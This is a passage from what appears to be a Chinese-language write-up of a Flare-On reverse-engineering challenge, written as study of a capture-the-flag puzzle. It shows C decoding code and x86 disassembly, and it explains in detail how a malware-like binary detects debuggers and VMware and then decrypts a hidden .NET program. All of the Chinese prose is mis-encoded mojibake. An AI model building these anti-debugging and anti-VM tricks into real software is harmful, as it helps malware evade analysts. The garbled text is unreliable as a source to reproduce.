    c = c ^ 64;
    printf("%c", c);
}

void e89a()
{
    c = 31;
    c = c ^ 113;
    printf("%c", c);
}

void e8a8()
{
    c = 0xb0;
    c = CROL(c, 0xbc);
    c -= 0xa3;
    printf("%c", c);
}

void e8b9()
{
    c = 0xe8;
    c += 121;
    printf("%c", c);
}

void e8c7()
{
    c = 0xf6;
    c += 40;
    c = CROL(c, 0x82);
    printf("%c", c);
}

void e8d8()
{
    c = 31;
    c -= 44;
    c = CROL(c, 77);
    c += 0xb0;
    printf("%c", c);
}

void e8ec()
{
    c = 0xaf;
    c -= 63;
    c = CROL(c, 42);
    c = c ^ 0xb8;
    c = CROR(c, 0x99);
    c -= 84;
    printf("%c", c);
}

void e906()
{
    c = 93;
    c = CROL(c, 0xba);
    printf("%c", c);
}

void e914()
{
    c = 41;
    c -= 48;
    c = CROL(c, 108);
    c = c ^ 0xed;
    printf("%c", c);
}

void e928()
{
    c = 0xb5;
    c += 0xbf;
    printf("%c", c);
}

void e936()
{
    c = 0xa5;
    c -= 99;
    c += 49;
    c = CROR(c, 123);
    c -= 0x8c;
    c = CROR(c, 0xbc);
    printf("%c", c);
}

void e950()
{
    c = 0xf3;
    c = CROR(c, 0x98);
    c = c ^ 0xae;
    c = CROR(c, 22);
    c = CROR(c, 32);
    printf("%c", c);
}

void e967()
{
    c = 0xa6;
    c -= 0xd2;
    c = CROL(c, 110);
    printf("%c", c);
}

void e978()
{
    c = 98;
    c -= 52;
    printf("%c", c);
}

void e986()
{
    c = 50;
    c = c ^ 0xb2;
    c -= 98;
    c += 16;
    c -= 0xcd;
    printf("%c", c);
}

void e99d()
{
    c = 0xeb;
    c = CROL(c, 7);
    c = c ^ 115;
    c = c ^ 0xb7;
    printf("%c", c);
}

void e9b1()
{
    c = 11;
    c += 76;
    c -= 91;
    c = CROL(c,  54);
    c += 97;
    c -= 52;
    printf("%c", c);
}

void e9cb()
{
    c = 0x9a;
    c -= 90;
    printf("%c", c);
}

void e9d9()
{
    c = 0x99;
    c = CROL(c, 0xa2);
    printf("%c", c);
}

void e9e7()
{
    c = 43;
    c += 0xe7;
    c = c ^ 126;
    printf("%c", c);
}

void e9f8()
{
    c = 0xaf;
    c = CROR(c, 87);
    c = CROL(c, 74);
    c -= 78;
    c = c ^ 0x86;
    c += 0xb8;
    printf("%c", c);
}

void ea12()
{
    c = 0xc3;
    c = c ^ 0xad;
    c = c ^ 74;
    c = CROR(c, 0x95);
    c = c ^ 0xe8;
    c = CROL(c, 0x86);
    printf("%c", c);
}

void ea2c()
{
    c = 3;
    c -= 28;
    c = c ^ 0xcc;
    c = CROL(c, 69);
    printf("%c", c);
}

void a40()
{
    c = 0xe3;
    c += 74;
    printf("%c", c);
}

void a4e()
{
    c = 0xca;
    c = CROL(c, 0x90);
    c = c ^ 0xa5;
    printf("%c", c);
}

// n
void a5f()
{
    c = 62;
    c += 0xd8;
    c = c ^ 120;
    c = CROR(c, 54);
    c = CROL(c, 0xde);
    printf("%c", c);
}

// .
void a76()
{
    unsigned char c = 0xd8;
    c = CROR(c, 17);
    c = CROR(c, 0xa2);
    c = CROL(c, 0x89);
    c += 0xad;
    c -= 0xb5;
    printf("%c", c);
}

// c
void a90()
{
    unsigned char c = 0x82;
    c = CROL(c, 0xc0);
    c += 33;
    c -= 64;
    printf("%c", c);
}

// o
void aa4()
{
    char c = 123;
    c = CROR(c, 0xe3);
    printf("%c", c);
}

// m
void ab2()
{
    char c = 0xd7;
    c = CROL(c, 0xf6);
    c += 120;
    printf("%c", c);
}

int main()
{
    e87c();
    e886();
    e89a();
    e8a8();
    e8b9();
    e8c7();
    e8d8();
    e8ec();
    e906();
    e914();
    e928();
    e936();
    e950();
    e967();
    e978();
    e986();
    e99d();
    e9b1();
    e9cb();
    e9d9();
    e9e7();
    e9f8();
    ea12();
    ea2c();
    a40();
    a4e();
    a5f();
    a76();
    a90();
    aa4();
    ab2();

    return 0;
}
</code></pre><hr><h2>ç¬¬ä¸ƒé¢˜</h2><p>è¿™ä¸ªç¨‹åºä½¿ç”¨äº†å¤§é‡åè°ƒè¯•/åè™šæ‹Ÿæœº/æ ¹æ®æ—¶é—´å®šæœŸè§¦å‘è¡Œä¸ºçš„ç‰¹æ€§, å¹¶ä¸”æ¯é€šè¿‡ä¸€ä¸ªæ£€æµ‹ç‚¹åå°±ä¼šå¯¹ç¨‹åºå¼‚æˆ–è§£å¯†ä¸€æ¬¡, å¦‚æœæ‰€æœ‰çš„æ£€æµ‹ç‚¹éƒ½é€šè¿‡å, ä¼šç”Ÿæˆä¸€ä¸ª dotNet ç¨‹åº, ç„¶åå†ç ´è§£è¿™ä¸ª dotNet ç¨‹åº, æ‰¾å‡ºé‚®ç®±åœ°å€.</p><p>è¿™ä¸ªç¨‹åºåœ¨ç¬¬ä¸€ä¸ªå‡½æ•° <code>call test.00401030</code> ä½¿ç”¨ <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/ms680345(v=vs.85).aspx"><code>IsDebuggerPresent</code></a> å‡½æ•°æ£€æµ‹æ˜¯å¦è¢«è°ƒè¯•, å¦‚æœç¨‹åºè¢«è°ƒè¯•è¿™ä¸ªå‡½æ•°è¿”å›éé›¶å€¼, å¦åˆ™è¿”å›å€¼ä¸º0.</p><p>ç¬¬äºŒä¸ªå‡½æ•° <code>call test.004010C0</code> æ£€æŸ¥ <strong>PEB(Process Environment Block)</strong> çš„ <strong>BeingDebugged</strong> æ ‡å¿—, å¦‚æœå€¼ä¸º 1 åˆ™è¡¨ç¤ºè¯¥ç¨‹åºè¢«è°ƒè¯•. å…¶åç§»ä½ç½®ä¸º <code>FS:[0x32]</code>. (<code>FS:0</code> æŒ‡å‘ <strong>TEB(Thread Environment Block)</strong>, <code>FS:[0x30]</code> æŒ‡å‘ <strong>PEB</strong>, è€Œ <strong>BeingDebugger</strong> åœ¨ <strong>PEB</strong> åç§» 2h å¤„).</p><p>ç¬¬ä¸‰ä¸ªå‡½æ•° <code>call test.00401130</code> é€šè¿‡ <code>sidt</code> æŒ‡ä»¤è·å–ä¸­æ–­æè¿°ç¬¦è¡¨ <strong>IDT(Interrupt Descriptor Table)</strong> çš„åœ°å€, å¦‚æœ IDT åœ°å€ä¸º <strong>0xFFxxxxxx</strong>, åˆ™è®¤ä¸ºç¨‹åºè¿è¡Œåœ¨è™šæ‹Ÿæœºä¸­, æ‹’ç»è§£å¯†ä»£ç . åœ¨ VMware çš„è™šæ‹Ÿæœºä¸Š IDT ä½äºåœ°å€ <strong>0xFFxxxxxx</strong>, è€ŒçœŸå®æœºåœ°å€ä¸º <strong>0x80xxxxxx</strong>. ä¸è¿‡æ¯”è¾ƒå¹¸è¿çš„æ˜¯ç”±äºVMwareæ›´æ–°, è¿™ä¸ªæ£€æµ‹ç‚¹å·²ç»å¤±æ•ˆäº†, æ‰€ä»¥æ­¤å‡½æ•°ä¸éœ€è¦ä¿®æ”¹äº†.</p><p>ç¬¬å››ä¸ªå‡½æ•° <code>call test.004011D0</code> é€šè¿‡æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ <code>in</code> æ¥æ£€æµ‹è™šæ‹Ÿæœº, æ­¤å¤„ä½¿ç”¨åŠŸèƒ½å· 0A è·å–VMware, æ£€æµ‹å…¶è¿”å›å€¼æ˜¯å¦ä¸º <strong>VMXH</strong>.</p><p>ç¬¬äº”ä¸ªå‡½æ•° <code>call test.004012A0</code> è¿ç»­è°ƒç”¨ <code>SetLastError</code>, <code>OutputDebugStringW</code> å’Œ <code>GetLastError</code> å‡½æ•°, å¦‚æœç¨‹åºè¢«è°ƒè¯•, åˆ™ <code>OutputDebugStringW</code> è°ƒç”¨æˆåŠŸ, <code>GetLastError</code> è¿”å›å€¼ä»æ—§æ˜¯åˆšåˆšé€šè¿‡ <code>SetLastError</code> è®¾ç½®çš„å€¼.</p><p>ç¬¬å…­ä¸ªå‡½æ•° <code>call test.00401350</code> æ£€æµ‹ä»åœ°å€åŒºé—´ <strong>test.00401030~test.00401780</strong> å†…æŒ‡ä»¤æ“ä½œç  <code>0xCC</code> æ•°ç›®æ˜¯å¦ç­‰äº 0x55, å¦‚æœä¸ç­‰, åˆ™è®¤ä¸ºç¨‹åºè¢«è°ƒè¯•.</p><p>ç¬¬ä¸ƒä¸ªå‡½æ•° <code>call test.004013F0</code> æ£€æµ‹ <strong>PEB</strong> åç§» 68h å¤„çš„ <strong>NtGlobalFlag</strong> æ ‡å¿—, å½“ç¨‹åºè¢«è°ƒè¯•æ—¶, è¯¥å€¼ç­‰äº 70h.</p><p>ç¬¬å…«ä¸ªå‡½æ•° <code>call test.00401460</code> æ£€æµ‹å½“å‰æ—¥æœŸæ˜¯å¦ä¸ºä»»æ„ä¸€ä¸ªæœˆçš„ 5 å·, å¦‚æœæ˜¯ 5 å·çš„è¯å°±è§£å¯†ç¨‹åº...</p><p>ç„¶åæ˜¯è·å–å½“å‰è¿›ç¨‹æ–‡ä»¶çš„è·¯å¾„ä»¥åŠå‚æ•°çš„èµ·å§‹åœ°å€, å­˜æ”¾åœ¨ <strong>eax</strong> ä¸­. æ­¤å¤„è¦å°† <strong>eax</strong> æŒ‡å‘çš„å­—ç¬¦ä¸²ä¿®æ”¹ä¸º <strong>backdoge.exe</strong>, åé¢å‡½æ•°ä¼šä½¿ç”¨åˆ°è¿™ä¸ªæ£€æµ‹ç‚¹.</p><p>ç¬¬ä¹ä¸ªå‡½æ•° <code>call test.004014F0</code> æ£€æŸ¥ <strong>eax</strong> æŒ‡å‘çš„å­—ç¬¦ä¸²æ˜¯å¦ç­‰äº <strong>backdoge.exe</strong>, å¦‚æœæ˜¯åˆ™è§£å¯†ç¨‹åº....</p><p>ç¬¬åä¸ªå‡½æ•° <code>call test.00401590</code> æœ‰ä¸¤ä¸ªæ£€æµ‹ç‚¹, ä½†æ˜¯, å¦‚æœæ£€æµ‹æ¡ä»¶ä¸ºçœŸçš„è¯ä¼š <strong>æ··æ·†(ä¸æ˜¯è§£å¯†å“¦)</strong> ä»£ç , æ‰€ä»¥ä¸€å®šè¦ç¡®ä¿æ£€æµ‹ç‚¹ä¸ºå‡. ä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹æœ¬å‡½æ•°ä¸éœ€è¦ä¿®æ”¹. å› ä¸ºç›®å‰å¤§å¤šè¿˜åœ¨ä½¿ç”¨ IPv4, å¹¶ä¸”ä¸ä¼šå°† <strong>www.dogecoin.com</strong> é‡å®šå‘åˆ° <strong>127.0.0.1</strong>(è¿™ä¸ªæ£€æµ‹ç‚¹æœ‰ç‚¹æ€ª, è°ä¼šå°†è¿™ä¸ªåŸŸåé‡å®šå‘åˆ°127.0.0.1å‘¢???).</p><p>ç¬¬åä¸€ä¸ªå‡½æ•° <code>call test.004016F0</code> åˆæ˜¯æ£€æµ‹æ—¶é—´çš„. å¦‚æœå½“å‰æ—¶é—´ç‚¹ä¸º <strong>17ç‚¹</strong> çš„è¯, åˆ™é€šè¿‡æ£€æµ‹, è§£å¯†ä»£ç .</p><pre><code>#!bash
00401B13   &gt; \E8 18F5FFFF   call test.00401030
00401B18   .  E8 A3F5FFFF   call test.004010C0
00401B1D   .  E8 0EF6FFFF   call test.00401130
00401B22   .  E8 A9F6FFFF   call test.004011D0
00401B27   .  E8 74F7FFFF   call test.004012A0
00401B2C   .  E8 1FF8FFFF   call test.00401350
00401B31   .  E8 BAF8FFFF   call test.004013F0
00401B36   .  E8 25F9FFFF   call test.00401460
00401B3B   .  8B06          mov eax, dword ptr ds:[esi]
00401B3D   .  E8 AEF9FFFF   call test.004014F0
00401B42   .  E8 49FAFFFF   call test.00401590
00401B47   .  E8 A4FBFFFF   call test.004016F0
</code></pre><p>åé¢è¿™æ®µä»£ç æ˜¯è§£å¯†ä»£ç çš„, ä¸ç”¨ç®¡.</p><pre><code>#!bash
00401B4C  |.  8B1D 38945100            mov ebx, dword ptr ds:[test.519438]
00401B52  |.  8B3E                     mov edi, dword ptr ds:[esi]
00401B54  |.  33C9                     xor ecx, ecx
00401B56  |.  85DB                     test ebx, ebx
00401B58  |.  74 29                    jz short test.00401B83
00401B5A  |.  8D9B 00000000            lea ebx, [ebx]
00401B60  |&gt;  B8 ABAAAAAA              /mov eax, AAAAAAAB
00401B65  |.  F7E1                     |mul ecx
00401B67  |.  C1EA 03                  |shr edx, 3
00401B6A  |.  8D0452                   |lea eax, [edx*2+edx]
00401B6D  |.  03C0                     |add eax, eax
00401B6F  |.  03C0                     |add eax, eax
00401B71  |.  8BD1                     |mov edx, ecx
00401B73  |.  2BD0                     |sub edx, eax
00401B75  |.  8A043A                   |mov al, byte ptr ds:[edi+edx]
00401B78  |.  3081 F8314100            |xor byte ptr ds:[ecx+test.4131F8], al
00401B7E  |.  41                       |inc ecx
00401B7F  |.  3BCB                     |cmp ecx, ebx
00401B81  |.^ 72 DD                    \jb short test.00401B60
</code></pre><p>ç¬¬åäºŒä¸ªå‡½æ•° <code>call test.004017A0</code>. è¿™ä¸ªå‡½æ•°ä¸ <strong>ç¬¬åä¸ªå‡½æ•°</strong> æ£€æµ‹ç±»ä¼¼, å¦‚æœæ‚¨æ²¡æœ‰ä¿®æ”¹ç¬¬åä¸ªæ£€æµ‹å‡½æ•°, å³æ‚¨ç”µè„‘ä½¿ç”¨äº† IPv4, åˆ™æœ¬å‡½æ•°ä¹Ÿä¸éœ€è¦ä¿®æ”¹.</p><p>ç¬¬åä¸‰ä¸ªå‡½æ•° <code>call test.004018A0</code> éœ€è¦ç¿»å¢™è®¿é—® <strong>https://twitter.com/FireEye/status/484033515538116608</strong>, è¯»å–é¡µé¢å†…å®¹, å°† <strong>Secluded Hi</strong> åé¢çš„ 7 ä¸ªå­—èŠ‚(ä¹Ÿå°±æ˜¯ <strong>jackRAT</strong>)ä½œä¸ºå¼‚æˆ–è§£å¯†çš„å¯†é’¥è§£å¯†ç¨‹åº. ä½ å¯ä»¥ç¿»å¢™, æˆ–è€…æœ¬åœ°æ­æœåŠ¡å™¨ä¿®æ”¹host~</p><pre><code>#!bash
00401B83  |&gt; \E8 18FCFFFF              call test.004017A0
00401B88  |.  E8 13FDFFFF              call test.004018A0                      ; [test.004018A0
</code></pre><p>è‡³æ­¤, &#42;*&#42;|||||||&#42;ä¹‹é—´çš„ä»£ç å·²è¢«è§£å¯†, é™¤äº† <strong>MZ</strong> å’Œ <strong>PE</strong> æ ‡å¿—å­—ç¬¦ä¸²ä»¥å¤–, è¿™æ®µå†…å­˜å·²ç»æ˜¯ä¸ªæ ‡å¿—çš„PEæ–‡ä»¶äº†. ä¸‹é¢è¿™æ®µä»£ç å°±æ˜¯å–ç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½® <strong>MZ</strong> æ ‡å¿—ä½, å–ç¬¬äºŒä¸ªå‚æ•°è®¾ç½® <strong>PE</strong> æ ‡å¿—ä½:</p><pre><code>#!bash
00401B8D   .  8B4E 04               mov ecx, dword ptr ds:[esi+0x4]
00401B90   .  0FB611                movzx edx, byte ptr ds:[ecx]
00401B93   .  8815 F8314100         mov byte ptr ds:[0x4131F8], dl
00401B99   .  8B46 04               mov eax, dword ptr ds:[esi+0x4]
00401B9C   .  8A48 01               mov cl, byte ptr ds:[eax+0x1]
00401B9F   .  880D F9314100         mov byte ptr ds:[0x4131F9], cl
00401BA5   .  8B56 08               mov edx, dword ptr ds:[esi+0x8]
00401BA8   .  8A02                  mov al, byte ptr ds:[edx]
00401BAA   .  A2 78324100           mov byte ptr ds:[0x413278], al
00401BAF   .  8B4E 08               mov ecx, dword ptr ds:[esi+0x8]
00401BB2   .  0FB651 01             movzx edx, byte ptr ds:[ecx+0x1]
</code></pre><p>å› æ­¤, è¿™ä¸ªç¨‹åºçš„0ä¸¤ä¸ªå‚æ•°åˆ†åˆ«ä¸º <strong>MZ</strong> å’Œ <strong>PE</strong>.</p><p>å†åé¢å°±æ˜¯å°†è§£å¯†åçš„ç¨‹åºå†™å…¥æ–‡ä»¶ <strong>gratz.exe</strong> å¹¶è¿è¡Œäº†.</p><p>ç¨‹åºè¿è¡Œç•Œé¢: <img alt="flare-on challenge 7" img-src="03360b43edf0ff0a21b706fdcf382be1d59b9429.jpg"></p><p>è¿™æ˜¯ä¸ª .Net ç¨‹åº, æ‹–åˆ° <strong>ILSpy</strong> é‡Œ, å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç¨‹åºç»“æ„:</p><p><img alt="flare-on challenge 7" img-src="2136db017c70b303639d2a840e75c7c05c00896e.jpg"></p><p>å…¶ä¸­, <code>lulz.decoder1</code>, <code>lulz.decoder2</code>, <code>lulz.decoder3</code> å’Œ <code>lulz.decoder4</code> éƒ½æ˜¯å°†è¾“å…¥å­—ç¬¦ä¸²çš„æ¯ä¸ªå­—ç¬¦ç»è¿‡ä¸€ç³»åˆ—è½¬æ¢åç”Ÿæˆè§£å¯†åçš„å­—ç¬¦. è§£å¯†åå‘ç° <code>lulz.datwork</code> é‡Œé¢ä½¿ç”¨SMTPåè®®å‘é€é‚®ä»¶çš„å‡ ä¸ªè®¾ç½®éƒ½æ˜¯é”™è¯¯çš„, å…¶å…·ä½“å€¼ä¸º:</p><pre><code>#!bash
To: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2b4a471a054f4a5f054f4a5f4a6b4d474a594e06444505484446">[email&#160;protected]</a>
Subject: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="87e6ebb6a9e3e6f3a9e3e6f3e6c7e1ebe6f5e2aae8e9a9e4e8ea">[email&#160;protected]</a>
From: <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="cca0b9a0b68caaa0adbea9e1a3a2e2afa3a1">[email&#160;protected]</a>
SmtpClient: smtp.secureserver.net
</code></pre><p>å¦å¤–è¿˜å‘ç°æ²¡æœ‰ä½¿ç”¨ <code>lulz.decoder4</code>. åæ¥åœ¨ <code>From1.lulzors</code> é‡Œé¢å‘ç°æœ‰è°ƒç”¨ <code>lulz.decoder4</code>, åˆšå¥½è¿™ä¸ªå‡½æ•°æ˜¯ç•Œé¢åˆå§‹åŒ–çš„å‡½æ•°:</p><pre><code>#!c#
// Finisher.Form1
public void lulzors()
{
    lulz lulz = new lulz();
    Thread thread = new Thread(new ThreadStart(lulz.datwork));
    thread.Start();
    while (thread.IsAlive)
    {
    }
    this.label2.Text = lulz.decoder4("\v\fP\u000e\u000fBA\u0006\rG\u0015I\u001a\u0001\u0016H\\\t\b\u0002\u0013/\b\t^\u001d\bJO\a]C\u001b\u0005");
}
</code></pre><p>è¿™ä¸ª <code>Form1.label2</code> åº”è¯¥å°±æ˜¯ç¨‹åºç•Œé¢ä¸‹æ–¹ç©ºç™½çš„é‚£ä¸€éƒ¨åˆ†å§, æŠŠè°ƒç”¨ <code>lulz.decoder4</code> è¿™ä¸€è¡Œå•ç‹¬æ‹¿å‡ºæ¥æ‰§è¡Œ, å…¶ç»“æœä¸º:</p><pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="335752041d55025241561d555a5d5a405b1d5f5a5d0073555f5241561e5c5d1d505c5e">[email&#160;protected]</a>
</code></pre><p>è¿™ä¸ªå°±æ˜¯æœ€ç»ˆæ­£ç¡®çš„é‚®ç®±åœ°å€äº†.</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä¿®æ”¹ç¨‹åº, è®©ç¨‹åºç›´æ¥è¾“å‡ºé‚®ç®±åœ°å€:</p><p><img alt="flare-on challenge 7" img-src="33827339b7cdb76fc5e08380c2f7c2ba4a022399.jpg"></p><h2>å‚è€ƒé“¾æ¥:</h2><ul><li><a href="http://bbs.pediy.com/showthread.php?t=119969">ã€åŸåˆ›ã€‘è™šæ‹Ÿæœºæ£€æµ‹æŠ€æœ¯å‰–æ</a></li><li>åŠ å¯†ä¸è§£å¯†(ç¬¬ä¸‰ç‰ˆ)</li><li><a href="http://blog.csdn.net/hqucth/article/details/7884917">åˆ©ç”¨pdfçš„jså‡½æ•°æ¼æ´æ„é€ å †å–·å°„çš„æ”»å‡»æ€è·¯</a></li><li><a href="http://book.51cto.com/art/201405/438749.htm">æ‰¾åˆ°shellcode</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;ä¹Œäº‘çŸ¥è¯†åº“ç‰ˆæƒæ‰€æœ‰ æœªç»è®¸å¯ ç¦æ­¢è½¬è½½</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">asd</span> <span class="reply-time">2014-09-15 18:25:53</span></div><p></p><p>èµä¸€ä¸ª</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">daige</span> <span class="reply-time">2014-09-15 14:10:41</span></div><p></p><p>å¥½ç‰›ï¼Œèµä¸€ä¸ª</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">F1uYu4n</span> <span class="reply-time">2014-09-15 13:48:58</span></div><p></p><p>è¢«ç¬¬7é¢˜æé†‰äº†ï¼Œç­‰äº†å¥½ä¹…ï¼Œç»ˆäºæœ‰äººæœ‰è§£ç­”äº†ï¼Œæˆ‘å¾—å¥½å¥½çœ‹çœ‹</p><p></p></div></div></div></div></div></main>